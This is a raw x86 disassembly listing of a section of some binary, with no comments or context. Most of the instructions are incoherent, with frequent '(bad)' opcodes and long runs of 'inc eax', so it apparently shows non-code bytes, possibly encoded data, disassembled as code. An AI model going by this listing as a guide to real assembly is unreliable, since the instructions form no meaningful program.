  411f8e:	gs push edx
  411f90:	or     al,0xf3
  411f92:	dec    ecx
  411f93:	js     0x411ffe
  411f95:	adc    BYTE PTR [ebp+0x406f40e1],bh
  411f9b:	bound  ebx,QWORD PTR [edx+0x40401858]
  411fa1:	add    BYTE PTR [eax+0x40],al
  411fa4:	inc    eax
  411fa5:	inc    eax
  411fa6:	inc    eax
  411fa7:	inc    eax
  411fa8:	(bad)  ds:0x6bc804f6
  411fae:	add    eax,0x22409dc2
  411fb3:	dec    edx
  411fb4:	pop    eax
  411fb5:	ror    ebx,1
  411fb7:	bound  edi,QWORD PTR [esi]
  411fb9:	adc    al,0x68
  411fbb:	inc    eax
  411fbc:	gs cwde 
  411fbe:	dec    eax
  411fbf:	mov    eax,0x4d514043
  411fc4:	inc    esp
  411fc5:	push   ebx
  411fc6:	inc    esp
  411fc7:	add    eax,0x40660833
  411fcc:	and    al,0xb5
  411fce:	xor    DWORD PTR [eax+0x40],eax
  411fd1:	inc    eax
  411fd2:	inc    eax
  411fd3:	inc    eax
  411fd4:	inc    eax
  411fd5:	inc    eax
  411fd6:	inc    eax
  411fd7:	inc    eax
  411fd8:	inc    eax
  411fd9:	xchg   BYTE PTR [eax+eax*2],dh
  411fdc:	aad    0x6e
  411fde:	leave  
  411fdf:	xchg   esi,eax
  411fe0:	adc    BYTE PTR [esi+0x47],al
  411fe3:	outs   dx,BYTE PTR ds:[esi]
  411fe4:	fwait
  411fe5:	xchg   ebp,eax
  411fe6:	not    BYTE PTR ds:0x40853763
  411fec:	and    al,0x40
  411fee:	inc    eax
  411fef:	inc    eax
  411ff0:	inc    eax
  411ff1:	inc    eax
  411ff2:	inc    eax
  411ff3:	int3   
  411ff4:	jne    0x412036
  411ff6:	inc    ebx
  411ff7:	test   al,0x60
  411ff9:	adc    DWORD PTR [edx+0x79120e43],eax
  411fff:	pop    ebx
  412000:	jmp    0x4229:0x4090c0a8
  412007:	mov    edi,0x23bd12fa
  41200c:	smsw   WORD PTR [edi+eiz*2+0x43153894]
  412014:	inc    eax
  412015:	add    cl,al
  412017:	inc    eax
  412018:	inc    eax
  412019:	inc    eax
  41201a:	inc    eax
  41201b:	add    BYTE PTR [eax+0x40],al
  41201e:	repz inc esi
  412020:	int    0x43
  412022:	ret    
  412023:	retf   0x9d1
  412026:	push   es
  412027:	imul   edi,DWORD PTR [eax-0x56],0x40154962
  41202e:	push   ecx
  41202f:	inc    ecx
  412030:	bound  edx,QWORD PTR [edx+0x1430355d]
  412036:	push   esp
  412037:	inc    ecx
  412038:	inc    edx
  412039:	xchg   DWORD PTR [eax+0x64],edi
  41203c:	inc    eax
  41203d:	inc    eax
  41203e:	inc    eax
  41203f:	inc    eax
  412040:	inc    eax
  412041:	inc    eax
  412042:	inc    eax
  412043:	inc    eax
  412044:	inc    DWORD PTR [eax-0x2d]
  412047:	inc    eax
  412048:	aaa    
  412049:	inc    eax
  41204a:	push   edx
  41204b:	test   eax,0x35fb952
  412050:	inc    edx
  412051:	sub    eax,0xc3fa9004
  412056:	inc    ecx
  412057:	inc    eax
  412058:	jge    0x412069
  41205a:	int    0x49
  41205c:	les    edi,FWORD PTR [ebp+0x40501543]
  412062:	push   eax
  412063:	mov    cl,0x40
  412065:	inc    eax
  412066:	inc    eax
  412067:	inc    eax
  412068:	inc    eax
  412069:	inc    eax
  41206a:	inc    eax
  41206b:	inc    eax
  41206c:	inc    eax
  41206d:	inc    eax
  41206e:	dec    edi
  41206f:	mov    eax,ds:0x325f4030
  412074:	inc    edx
  412075:	mov    cs,WORD PTR [esi-0x3d]
  412078:	xor    BYTE PTR [edx],dl
  41207a:	cmp    DWORD PTR ds:0xbc336831,edi
  412080:	inc    edi
  412081:	inc    eax
  412082:	cmc    
  412083:	inc    eax
  412084:	inc    eax
  412085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412086:	bound  ecx,QWORD PTR ds:0x2fff1485
  41208c:	bound  ecx,QWORD PTR [eax+eax*1+0x4040404c]
  412093:	inc    eax
  412094:	inc    eax
  412095:	inc    eax
  412096:	inc    eax
  412097:	inc    eax
  412098:	add    BYTE PTR [ebx+0x40],al
  41209b:	dec    ebp
  41209c:	or     eax,0x18546975
  4120a1:	nop
  4120a2:	adc    ebx,DWORD PTR [eax+0x44f92e40]
  4120a8:	pop    esp
  4120a9:	rol    BYTE PTR [eax+0x3a],0x95
  4120ad:	lods   eax,DWORD PTR ds:[esi]
  4120ae:	data16 xor al,0x64
  4120b1:	inc    ebx
  4120b2:	push   cs
  4120b3:	pop    edx
  4120b4:	adc    BYTE PTR [edx+0x19],ah
  4120b7:	inc    ecx
  4120b8:	pop    eax
  4120b9:	rol    DWORD PTR [eax-0xf],1
  4120bc:	jnp    0x41210c
  4120be:	xor    eax,0x40404050
  4120c3:	inc    eax
  4120c4:	inc    eax
  4120c5:	inc    eax
  4120c6:	and    eax,0x10404040
  4120cb:	loope  0x4120d6
  4120cd:	dec    esi
  4120ce:	inc    ebx
  4120cf:	sub    BYTE PTR [ebp+0x74],al
  4120d2:	leave  
  4120d3:	in     al,0x40
  4120d5:	adc    eax,DWORD PTR [ecx-0x39]
  4120d8:	dec    esp
  4120d9:	jecxz  0x412127
  4120db:	popw   ds
  4120dd:	inc    eax
  4120de:	inc    eax
  4120df:	inc    eax
  4120e0:	inc    eax
  4120e1:	inc    eax
  4120e2:	inc    eax
  4120e3:	inc    eax
  4120e4:	inc    eax
  4120e5:	inc    eax
  4120e6:	inc    eax
  4120e7:	or     eax,0x413d5840
  4120ec:	add    eax,0x2c12400e
  4120f1:	test   al,0x42
  4120f3:	push   ecx
  4120f4:	retf   
  4120f5:	inc    ecx
  4120f6:	adc    al,0x27
  4120f8:	aas    
  4120f9:	inc    edx
  4120fa:	add    DWORD PTR [edi+0x43],esp
  4120fd:	inc    ebx
  4120fe:	inc    eax
  4120ff:	push   ecx
  412100:	inc    eax
  412101:	inc    eax
  412102:	inc    eax
  412103:	inc    eax
  412104:	inc    eax
  412105:	inc    eax
  412106:	rol    DWORD PTR [eax+0x40],0x41
  41210a:	sub    bh,BYTE PTR [eax+eiz*2+0x11]
  41210e:	xor    BYTE PTR [eax],dl
  412110:	xor    DWORD PTR [edi],ebx
  412112:	adc    DWORD PTR [edx-0x3b],esp
  412115:	add    BYTE PTR [eax+eax*2],ch
  412118:	sbb    BYTE PTR [eax-0x48],al
  41211b:	inc    eax
  41211c:	inc    eax
  41211d:	add    BYTE PTR [eax+0x40],al
  412120:	inc    eax
  412121:	inc    eax
  412122:	inc    eax
  412123:	inc    eax
  412124:	in     eax,0xd1
  412126:	push   edx
  412127:	inc    edi
  412128:	sbb    ebp,esi
  41212a:	and    eax,0x8a664c44
  41212f:	test   DWORD PTR [eax-0x5],eax
  412132:	jns    0x4120ba
  412134:	cmp    eax,0x1243c134
  412139:	imul   eax,DWORD PTR [eax-0x60],0x40
  41213d:	inc    eax
  41213e:	inc    eax
  41213f:	inc    eax
  412140:	inc    eax
  412141:	inc    eax
  412142:	inc    eax
  412143:	inc    eax
  412144:	inc    eax
  412145:	inc    eax
  412146:	enter  0x585b,0x90
  41214a:	inc    eax
  41214b:	pop    ss
  41214c:	sub    eax,0x11d64d52
  412151:	fld    QWORD PTR [ebx]
  412153:	inc    edx
  412154:	xor    eax,DWORD PTR [eax+0x14]
  412157:	add    eax,0xd3404341
  41215c:	ja     0x4121a4
  41215e:	inc    ecx
  41215f:	leave  
  412160:	(bad)  
  412162:	add    eax,0x40404843
  412167:	inc    eax
  412168:	inc    eax
  412169:	inc    eax
  41216a:	inc    eax
  41216b:	int3   
  41216c:	jne    0x4121ae
  41216e:	test   bl,ch
  412170:	dec    eax
  412171:	cld    
  412172:	sbb    eax,0x26247140
  412177:	addr16 and eax,0x40049962
  41217d:	adc    eax,0x6bcbd844
  412182:	mov    es,WORD PTR [eax+0x12]
  412185:	inc    ecx
  412186:	push   eax
  412187:	adc    eax,0x40543512
  41218c:	or     DWORD PTR [edi+0x16],esp
  41218f:	dec    ebp
  412190:	inc    eax
  412191:	add    cl,al
  412193:	inc    eax
  412194:	inc    eax
  412195:	inc    eax
  412196:	inc    eax
  412197:	add    BYTE PTR [eax+0x3],al
  41219a:	inc    eax
  41219b:	inc    ecx
  41219c:	inc    eax
  41219d:	inc    esp
  41219e:	inc    edx
  41219f:	sub    al,0x36
  4121a1:	in     eax,dx
  4121a2:	inc    eax
  4121a3:	inc    ebx
  4121a4:	adc    al,0xd0
  4121a6:	sub    al,0x84
  4121a8:	(bad)  
  4121a9:	inc    eax
  4121aa:	inc    eax
  4121ab:	inc    eax
  4121ac:	inc    eax
  4121ad:	inc    eax
  4121ae:	inc    eax
  4121af:	inc    eax
  4121b0:	inc    eax
  4121b1:	inc    DWORD PTR [eax+0x63]
  4121b4:	inc    eax
  4121b5:	xor    BYTE PTR [eax+0xf],al
  4121b8:	push   ebx
  4121b9:	ret    
  4121ba:	idiv   BYTE PTR [edi+0x421828bf]
  4121c0:	inc    eax
  4121c1:	push   ecx
  4121c2:	mov    ebp,0x40477d2a
  4121c7:	shl    BYTE PTR [ebx],1
  4121c9:	repnz aam 0x7d
  4121cc:	mov    ebp,0x1ab51485
  4121d1:	push   edx
  4121d2:	add    eax,0x40400575
  4121d7:	inc    eax
  4121d8:	inc    eax
  4121d9:	inc    eax
  4121da:	inc    eax
  4121db:	inc    eax
  4121dc:	inc    eax
  4121dd:	inc    eax
  4121de:	inc    eax
  4121df:	inc    ebx
  4121e0:	inc    eax
  4121e1:	inc    edx
  4121e2:	pop    edi
  4121e3:	test   al,0x52
  4121e5:	div    esi
  4121e7:	nop
  4121e8:	outs   dx,BYTE PTR ds:[esi]
  4121e9:	fild   WORD PTR [eax+0x12]
  4121ec:	sahf   
  4121ed:	arpl   WORD PTR [edi-0x6],cx
  4121f0:	inc    eax
  4121f1:	jae    0x4121af
  4121f3:	dec    eax
  4121f4:	rol    BYTE PTR [ebx],cl
  4121f6:	mov    ebp,0x40420e43
  4121fb:	int3   
  4121fc:	imul   ebp,DWORD PTR [ebx-0x2bbf2eeb],0x2c
  412203:	daa    
  412204:	inc    eax
  412205:	inc    eax
  412206:	inc    eax
  412207:	inc    eax
  412208:	inc    eax
  412209:	inc    eax
  41220a:	inc    eax
  41220b:	inc    eax
  41220c:	add    BYTE PTR [ecx+0xf35c8d3],dh
  412212:	add    bl,BYTE PTR [ebx]
  412214:	(bad)  
  412215:	shr    BYTE PTR [esi],1
  412217:	inc    ecx
  412218:	pusha  
  412219:	inc    eax
  41221a:	inc    eax
  41221b:	inc    edx
  41221c:	mov    ds:0x4040b043,al
  412221:	inc    eax
  412222:	inc    eax
  412223:	inc    eax
  412224:	inc    eax
  412225:	and    eax,0x54404040
  41222a:	out    0x9,eax
  41222c:	nop
  41222d:	adc    ebp,eax
  41222f:	test   eax,0x4055ca09
  412234:	pop    ss
  412235:	jb     0x4122a6
  412237:	into   
  412238:	xor    DWORD PTR [eax+0x45401441],ebp
  41223e:	lods   al,BYTE PTR ds:[esi]
  41223f:	mov    esp,DWORD PTR [edx+0xd]
  412242:	inc    ebx
  412243:	inc    eax
  412244:	jb     0x4122bc
  412246:	ins    BYTE PTR es:[edi],dx
  412247:	mov    eax,ds:0x3304312
  41224c:	call   0x40815d91
  412251:	inc    eax
  412252:	inc    eax
  412253:	inc    eax
  412254:	inc    eax
  412255:	inc    eax
  412256:	inc    eax
  412257:	inc    eax
  412258:	inc    eax
  412259:	int3   
  41225a:	pushf  
  41225b:	add    DWORD PTR [eax+eax*2],esp
  41225e:	inc    ecx
  41225f:	retf   
  412260:	sbb    BYTE PTR [ebx+0x63],bl
  412263:	mov    esp,0x36a01547
  412268:	push   edx
  412269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41226a:	add    eax,0xf408589
  41226f:	inc    eax
  412270:	jmp    0x4404ec3f
  412275:	adc    al,BYTE PTR [eax+0x29]
  412278:	sub    BYTE PTR [edi+0x40900948],al
  41227e:	adc    al,0x40
  412280:	inc    eax
  412281:	inc    eax
  412282:	inc    eax
  412283:	inc    eax
  412284:	inc    eax
  412285:	rol    DWORD PTR [eax+0x40],0x72
  412289:	push   edx
  41228a:	mov    ch,0x5e
  41228c:	inc    ebp
  41228d:	xchg   edi,eax
  41228e:	adc    al,0x44
  412290:	inc    eax
  412291:	dec    eax
  412292:	enter  0x48a7,0x43
  412296:	inc    eax
  412297:	xor    dh,BYTE PTR [eax]
  412299:	xchg   ebp,eax
  41229a:	inc    eax
  41229b:	inc    eax
  41229c:	add    BYTE PTR [eax+0x40],al
  41229f:	inc    eax
  4122a0:	inc    eax
  4122a1:	inc    eax
  4122a2:	inc    eax
  4122a3:	push   edi
  4122a4:	pop    ebx
  4122a5:	inc    eax
  4122a6:	rcl    DWORD PTR [ebx],1
  4122a8:	jb     0x4122f8
  4122aa:	jge    0x412265
  4122ac:	test   al,0x18
  4122ae:	rol    DWORD PTR [eax+0x44],0x40
  4122b2:	push   0x22
  4122b4:	test   al,0x70
  4122b6:	inc    eax
  4122b7:	inc    eax
  4122b8:	inc    eax
  4122b9:	inc    eax
  4122ba:	inc    eax
  4122bb:	inc    eax
  4122bc:	inc    eax
  4122bd:	inc    eax
  4122be:	inc    eax
  4122bf:	inc    eax
  4122c0:	mov    ah,0xe
  4122c2:	and    DWORD PTR [ebx],esi
  4122c4:	addr16 xor eax,0x4052627d
  4122ca:	inc    ebx
  4122cb:	(bad)  
  4122cc:	fadd   QWORD PTR [eax+0x40]
  4122cf:	inc    eax
  4122d0:	inc    eax
  4122d1:	inc    eax
  4122d2:	inc    eax
  4122d3:	int3   
  4122d4:	jne    0x412316
  4122d6:	inc    esp
  4122d7:	xor    al,BYTE PTR [ebx+0x4]
  4122da:	or     DWORD PTR [eax+0x41],esp
  4122dd:	push   dx
  4122df:	bound  esp,QWORD PTR [ecx+0x55cb4041]
  4122e5:	mul    DWORD PTR fs:[eax]
  4122e8:	rol    DWORD PTR [ebx+0x1f],0xe
  4122ec:	jb     0x412350
  4122ee:	dec    ebp
  4122ef:	and    BYTE PTR [eax+0x0],al
  4122f2:	rol    DWORD PTR [eax+0x40],0x40
  4122f6:	inc    eax
  4122f7:	add    BYTE PTR [eax-0x44],al
  4122fa:	xor    BYTE PTR [eax+0x40],al
  4122fd:	inc    ecx
  4122fe:	fistp  DWORD PTR [esi+0x62]
  412301:	inc    ecx
  412302:	and    BYTE PTR [ecx+ecx*1],dl
  412305:	(bad)  
  412306:	cld    
  412307:	xor    DWORD PTR [esi+edx*1],esi
  41230a:	inc    edi
  41230b:	inc    eax
  41230c:	add    BYTE PTR [edx+0x62],0x4e
  412310:	push   ebx
  412311:	test   DWORD PTR fs:[eax],edx
  412314:	mov    al,ds:0x40404040
  412319:	inc    eax
  41231a:	inc    eax
  41231b:	inc    eax
  41231c:	inc    eax
  41231d:	inc    DWORD PTR [eax+0x2c]
  412320:	addr16 cmp al,0x3a
  412323:	gs pusha 
  412325:	inc    eax
  412326:	or     eax,0x2b4ddc40
  41232b:	test   al,0xf0
  41232d:	inc    eax
  41232e:	inc    eax
  41232f:	inc    eax
  412330:	inc    eax
  412331:	inc    eax
  412332:	inc    eax
  412333:	inc    eax
  412334:	inc    eax
  412335:	inc    eax
  412336:	inc    eax
  412337:	sbb    DWORD PTR [eax+0x21],eax
  41233a:	jge    0x412310
  41233c:	xor    eax,0x1f40a515
  412341:	inc    eax
  412342:	jo     0x412387
  412344:	inc    eax
  412345:	retf   
  412346:	mov    ah,0x12
  412348:	inc    ecx
  412349:	sub    BYTE PTR [esi+eax*4+0x50],ah
  41234d:	inc    edx
  41234e:	inc    ebx
  41234f:	inc    eax
  412350:	pusha  
  412351:	cmp    ch,BYTE PTR [ecx+0x67]
  412354:	inc    eax
  412355:	inc    eax
  412356:	inc    eax
  412357:	inc    eax
  412358:	inc    eax
  412359:	inc    eax
  41235a:	inc    eax
  41235b:	inc    eax
  41235c:	add    BYTE PTR [ecx-0x48],al
  41235f:	rol    BYTE PTR [ebx],cl
  412361:	push   ecx
  412362:	inc    eax
  412363:	nop
  412364:	pop    es
  412365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412366:	add    DWORD PTR [esi+0x9810340],0x4382ec50
  412370:	add    eax,0x62db05dd
  412375:	inc    eax
  412376:	inc    eax
  412377:	inc    eax
  412378:	inc    eax
  412379:	inc    eax
  41237a:	inc    eax
  41237b:	and    eax,0x3d404040
  412380:	inc    ebx
  412381:	outs   dx,DWORD PTR ds:[esi]
  412382:	inc    eax
  412383:	mov    al,ds:0x6cd5a84e
  412388:	inc    ebx
  412389:	les    eax,FWORD PTR [esi+edx*1]
  41238c:	inc    eax
  41238d:	adc    DWORD PTR [ebp-0x67],ebx
  412390:	mov    ds:0x40404041,al
  412395:	inc    eax
  412396:	inc    eax
  412397:	inc    eax
  412398:	inc    eax
  412399:	inc    eax
  41239a:	inc    eax
  41239b:	inc    eax
  41239c:	inc    eax
  41239d:	sub    DWORD PTR ds:0xc36239b8,0x5ae04043
  4123a7:	inc    edx
  4123a8:	add    BYTE PTR [edx-0x27],ch
  4123ab:	xor    BYTE PTR [eax+0x5],al
  4123ae:	inc    eax
  4123af:	das    
  4123b0:	inc    esp
  4123b1:	lods   al,BYTE PTR ds:[esi]
  4123b2:	mov    esp,0x3a07141c
  4123b7:	sbb    BYTE PTR [edx+0x45],ah
  4123ba:	add    eax,0x12a04047
  4123bf:	(bad)  
  4123c0:	int    0x40
  4123c2:	inc    eax
  4123c3:	inc    eax
  4123c4:	inc    eax
  4123c5:	inc    eax
  4123c6:	inc    eax
  4123c7:	rol    DWORD PTR [eax+0x40],0xc6
  4123cb:	test   BYTE PTR [ebp+0x41446513],0x69
  4123d2:	addr16 dec edi
  4123d4:	inc    ebx
  4123d5:	inc    eax
  4123d6:	addr16 daa 
  4123d8:	add    ch,dh
  4123da:	(bad)  
  4123db:	mov    esp,0xca200990
  4123e0:	imul   eax,DWORD PTR [ecx],0x40510dd8
  4123e6:	adc    eax,0x40004040
  4123eb:	inc    eax
  4123ec:	inc    eax
  4123ed:	inc    eax
  4123ee:	inc    eax
  4123ef:	inc    eax
  4123f0:	inc    edx
  4123f1:	sbb    al,0xc8
  4123f3:	pop    edx
  4123f4:	enter  0xc43,0x71
  4123f8:	adc    eax,0xbea962e8
  4123fd:	inc    eax
  4123fe:	inc    eax
  4123ff:	inc    eax
  412400:	inc    eax
  412401:	inc    eax
  412402:	inc    eax
  412403:	inc    eax
  412404:	inc    eax
  412405:	inc    eax
  412406:	inc    eax
  412407:	rol    DWORD PTR [eax+0x65],1
  41240a:	daa    
  41240b:	fs cs mov esp,0x2214720d
  412412:	inc    eax
  412413:	(bad)  
  412414:	lds    esp,FWORD PTR [edx+ecx*8]
  412417:	xchg   edi,eax
  412418:	inc    eax
  412419:	jp     0x412449
  41241b:	xor    al,0x40
  41241d:	inc    eax
  41241e:	inc    eax
  41241f:	inc    eax
  412420:	inc    eax
  412421:	inc    eax
  412422:	int3   
  412423:	jne    0x412465
  412425:	pop    ebp
  412426:	loop   0x4123e7
  412428:	ficom  DWORD PTR [eax]
  41242a:	push   edx
  41242b:	ins    BYTE PTR es:[edi],dx
  41242c:	adc    BYTE PTR [si+0x5],0x95
  412431:	inc    eax
  412432:	jmp    0xd1416678
  412437:	enter  0x1941,0xe1
  41243b:	push   esp
  41243c:	xor    al,0x94
  41243e:	jl     0x4123f7
  412440:	inc    ebx
  412441:	inc    eax
  412442:	sub    DWORD PTR [eax+0x0],eax
  412445:	rol    DWORD PTR [eax+0x40],0x40
  412449:	inc    eax
  41244a:	add    BYTE PTR [eax+0x40],al
  41244d:	mov    eax,ds:0x30a06862
  412452:	adc    al,BYTE PTR [edx+0x7dd5a802]
  412458:	ret    
  412459:	sbb    BYTE PTR [eax+0x24],al
  41245c:	inc    eax
  41245d:	adc    BYTE PTR [eax],dl
  41245f:	fmul   QWORD PTR [edx+0x47]
  412462:	add    ebp,DWORD PTR [ecx]
  412464:	pusha  
  412465:	sbb    ebp,esi
  412467:	jnp    0x4124a9
  412469:	test   DWORD PTR [eax+0x43],eax
  41246c:	pop    eax
  41246d:	adc    eax,DWORD PTR [eax+ecx*4+0x4e]
  412471:	inc    eax
  412472:	inc    eax
  412473:	inc    eax
  412474:	inc    eax
  412475:	inc    eax
  412476:	inc    eax
  412477:	inc    eax
  412478:	inc    eax
  412479:	inc    DWORD PTR [eax+0x43]
  41247c:	inc    eax
  41247d:	mov    ds:0x6a2c620c,eax
  412482:	xor    BYTE PTR [eax+0x1401d40],dl
  412488:	sub    ch,BYTE PTR [edx+ecx*2+0x2967746e]
  41248f:	stos   DWORD PTR es:[edi],eax
  412490:	int    0x13
  412492:	stos   DWORD PTR es:[edi],eax
  412493:	inc    ebx
  412494:	inc    eax
  412495:	inc    eax
  412496:	inc    eax
  412497:	inc    eax
  412498:	inc    eax
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	inc    eax
  41249c:	inc    eax
  41249d:	inc    eax
  41249e:	inc    eax
  41249f:	gs add al,0xc0
  4124a2:	push   edx
  4124a3:	adc    DWORD PTR [edx],ebx
  4124a5:	rol    DWORD PTR [eax+0x54],1
  4124a8:	inc    eax
  4124a9:	sub    BYTE PTR [esi+0x40e49a62],dl
  4124af:	sub    esp,DWORD PTR [eax-0x6e]
  4124b2:	add    BYTE PTR [eax+0x62],al
  4124b5:	inc    eax
  4124b6:	inc    eax
  4124b7:	inc    eax
  4124b8:	inc    eax
  4124b9:	inc    eax
  4124ba:	inc    eax
  4124bb:	inc    eax
  4124bc:	inc    eax
  4124bd:	add    BYTE PTR [edi],al
  4124bf:	jae    0x412537
  4124c1:	cmp    al,0x42
  4124c3:	mov    BYTE PTR [edx-0x76],al
  4124c6:	xchg   edi,eax
  4124c7:	inc    eax
  4124c8:	and    al,0x40
  4124ca:	stos   DWORD PTR es:[edi],eax
  4124cb:	bound  esp,QWORD PTR [ecx]
  4124cd:	ret    
  4124ce:	mov    edx,0xd4232940
  4124d3:	lds    esp,FWORD PTR [ebx]
  4124d5:	mov    edi,0x401b4041
  4124da:	add    edi,eax
  4124dc:	test   al,0x15
  4124de:	inc    eax
  4124df:	inc    eax
  4124e0:	inc    eax
  4124e1:	inc    eax
  4124e2:	inc    eax
  4124e3:	inc    eax
  4124e4:	and    eax,0x43404040
  4124e9:	jb     0x412516
  4124eb:	sub    eax,esp
  4124ed:	or     DWORD PTR ds:0x4c4030f6,0x2e0062e8
  4124f7:	dec    edi
  4124f8:	adc    al,0x40
  4124fa:	inc    eax
  4124fb:	inc    eax
  4124fc:	inc    eax
  4124fd:	inc    eax
  4124fe:	inc    eax
  4124ff:	inc    eax
  412500:	inc    eax
  412501:	inc    eax
  412502:	inc    eax
  412503:	inc    eax
  412504:	gs inc eax
  412506:	pushf  
  412507:	mov    BYTE PTR [ebx+0x4c],dl
  41250a:	inc    edi
  41250b:	inc    eax
  41250c:	adc    dh,BYTE PTR [ebx]
  41250e:	mov    bh,0x62
  412510:	inc    edx
  412511:	inc    eax
  412512:	inc    eax
  412513:	inc    eax
  412514:	inc    eax
  412515:	inc    eax
  412516:	inc    eax
  412517:	rol    DWORD PTR [eax+0x40],0x34
  41251b:	test   DWORD PTR [ecx-0x15],esi
  41251e:	inc    eax
  41251f:	(bad)  
  412520:	aad    0xc8
  412522:	push   eax
  412523:	inc    ebx
  412524:	inc    eax
  412525:	xor    esp,DWORD PTR [eax+0x36]
  412528:	push   ds
  412529:	enter  0x90a1,0x40
  41252d:	gs jl  0x412592
  412530:	in     eax,0x40
  412532:	inc    eax
  412533:	add    BYTE PTR [eax+0x40],al
  412536:	inc    eax
  412537:	inc    eax
  412538:	inc    eax
  412539:	inc    eax
  41253a:	inc    edx
  41253b:	inc    edi
  41253c:	or     eax,DWORD PTR [eax-0x51]
  41253f:	inc    edx
  412540:	bound  eax,QWORD PTR [eax]
  412542:	sub    DWORD PTR [edx-0x58],ecx
  412545:	inc    ecx
  412546:	mov    al,ds:0x34285c24
  41254b:	fadd   QWORD PTR [eax+0x40]
  41254e:	es call 0x603687b6
  412554:	sub    al,BYTE PTR [eax+0x2a]
  412557:	inc    edx
  412558:	enter  0x4024,0x40
  41255c:	inc    eax
  41255d:	inc    eax
  41255e:	inc    eax
  41255f:	inc    eax
  412560:	inc    eax
  412561:	inc    eax
  412562:	inc    eax
  412563:	inc    eax
  412564:	jno    0x4125a5
  412566:	inc    esp
  412567:	inc    eax
  412568:	inc    eax
  412569:	aaa    
  41256a:	sub    ch,cl
  41256c:	bound  eax,QWORD PTR [edi]
  41256e:	sub    al,BYTE PTR [ebx+0x21]
  412571:	dec    edx
  412572:	jnp    0x4125aa
  412574:	mov    al,0x2a
  412576:	inc    eax
  412577:	inc    eax
  412578:	inc    eax
  412579:	inc    eax
  41257a:	inc    eax
  41257b:	inc    eax
  41257c:	int3   
  41257d:	jne    0x4125bf
  41257f:	adc    BYTE PTR [eax+0x50],al
  412582:	inc    eax
  412583:	xor    eax,0xd37d03e6
  412588:	inc    eax
  412589:	loopne 0x4125eb
  41258b:	inc    edi
  41258c:	stc    
  41258d:	mov    cl,0xbe
  41258f:	inc    eax
  412590:	add    cl,al
  412592:	inc    eax
  412593:	inc    eax
  412594:	inc    eax
  412595:	inc    eax
  412596:	add    BYTE PTR [eax+0x22],al
  412599:	inc    eax
  41259a:	and    DWORD PTR [eax+0x48],eax
  41259d:	add    BYTE PTR [edx+0x5],dl
  4125a0:	jmp    0x4125e2
  4125a2:	push   ecx
  4125a3:	ins    BYTE PTR es:[edi],dx
  4125a4:	cmp    eax,0x47f61b89
  4125a9:	inc    eax
  4125aa:	mov    ds:0x1862c340,al
  4125af:	dec    edi
  4125b0:	inc    ebx
  4125b1:	mov    bl,0x2c
  4125b3:	add    DWORD PTR cs:[esi+0x62],esp
  4125b7:	push   0x40
  4125b9:	inc    eax
  4125ba:	inc    eax
  4125bb:	inc    eax
  4125bc:	inc    eax
  4125bd:	inc    eax
  4125be:	inc    eax
  4125bf:	inc    eax
  4125c0:	inc    DWORD PTR [eax+0x30]
  4125c3:	xchg   ebx,eax
  4125c4:	retf   0xab68
  4125c7:	mov    ah,0x64
  4125c9:	cmp    al,0x10
  4125cb:	mov    ah,0x41
  4125cd:	inc    eax
  4125ce:	inc    edx
  4125cf:	add    BYTE PTR [eax],dh
  4125d1:	inc    esp
  4125d2:	inc    edi
  4125d3:	dec    esp
  4125d4:	mov    eax,ds:0x4040402d
  4125d9:	inc    eax
  4125da:	inc    eax
  4125db:	inc    eax
  4125dc:	inc    eax
  4125dd:	inc    eax
  4125de:	inc    eax
  4125df:	inc    eax
  4125e0:	leave  
  4125e1:	mov    BYTE PTR [edi],ah
  4125e3:	jle    0x41256a
  4125e5:	dec    ebp
  4125e6:	arpl   WORD PTR [edx-0x48],ax
  4125e9:	(bad)  
  4125ea:	(bad)  
  4125eb:	ins    BYTE PTR es:[edi],dx
  4125ec:	inc    ebx
  4125ed:	jg     0x412610
  4125ef:	inc    eax
  4125f0:	dec    edx
  4125f1:	aad    0xd
  4125f3:	push   edx
  4125f4:	nop
  4125f5:	or     DWORD PTR [ebp+0x28],0x0
  4125f9:	dec    esp
  4125fa:	into   
  4125fb:	mov    edx,0x40614028
  412600:	rol    BYTE PTR [eax+0x40],1
  412603:	inc    eax
  412604:	inc    eax
  412605:	inc    eax
  412606:	inc    eax
  412607:	inc    eax
  412608:	inc    eax
  412609:	add    cl,ch
  41260b:	jb     0x4125ce
  41260d:	inc    ebx
  41260e:	sahf   
  41260f:	mov    WORD PTR ds:0xbe68e963,fs
  412615:	sar    DWORD PTR [esi+0x244830e3],1
  41261b:	bound  edx,QWORD PTR ds:0x404a8e4a
  412621:	sbb    cl,ah
  412623:	push   ebp
  412624:	mul    BYTE PTR [esp+ecx*2]
  412627:	bound  esi,QWORD PTR [edx]
  412629:	add    eax,0x814f35c5
  41262e:	inc    eax
  41262f:	inc    eax
  412630:	inc    eax
  412631:	inc    eax
  412632:	inc    eax
  412633:	inc    eax
  412634:	and    eax,0x30404040
  412639:	daa    
  41263a:	inc    eax
  41263b:	arpl   WORD PTR [edi-0x41],cx
  41263e:	jbe    0x4125e0
  412640:	sahf   
  412641:	inc    ebp
  412642:	and    eax,0xab3a4322
  412647:	inc    ecx
  412648:	mov    esi,0x418848a0
  41264d:	push   ebx
  41264e:	test   al,0x43
  412650:	inc    eax
  412651:	xor    BYTE PTR [eax+0x65],al
  412654:	push   edi
  412655:	bound  ecx,QWORD PTR ds:0x40ba4030
  41265b:	inc    eax
  41265c:	inc    eax
  41265d:	inc    eax
  41265e:	inc    eax
  41265f:	inc    eax
  412660:	inc    eax
  412661:	inc    eax
  412662:	inc    eax
  412663:	inc    eax
  412664:	xor    al,0x47
  412666:	aam    0x15
  412668:	leave  
  412669:	or     al,0x40
  41266b:	into   
  41266c:	inc    eax
  41266d:	inc    eax
  41266e:	inc    ebx
  41266f:	leave  
  412670:	or     al,BYTE PTR [edi+0x4c]
  412673:	jecxz  0x4126a3
  412675:	xor    eax,0x8549a8e3
  41267a:	inc    eax
  41267b:	push   ebx
  41267c:	inc    eax
  41267d:	push   0x404040a9
  412682:	inc    eax
  412683:	inc    eax
  412684:	inc    eax
  412685:	rol    DWORD PTR [eax+0x40],0x0
  412689:	lds    eax,FWORD PTR [ebx+0x40]
  41268c:	mov    ds:0xebbcca35,eax
  412691:	adc    al,0x90
  412693:	inc    eax
  412694:	push   ebp
  412695:	inc    eax
  412696:	inc    ebx
  412697:	or     eax,0x58c5629a
  41269c:	loope  0x4126fe
  41269e:	xor    eax,0x40cbb8c9
  4126a3:	inc    eax
  4126a4:	add    BYTE PTR [eax+0x40],al
  4126a7:	inc    eax
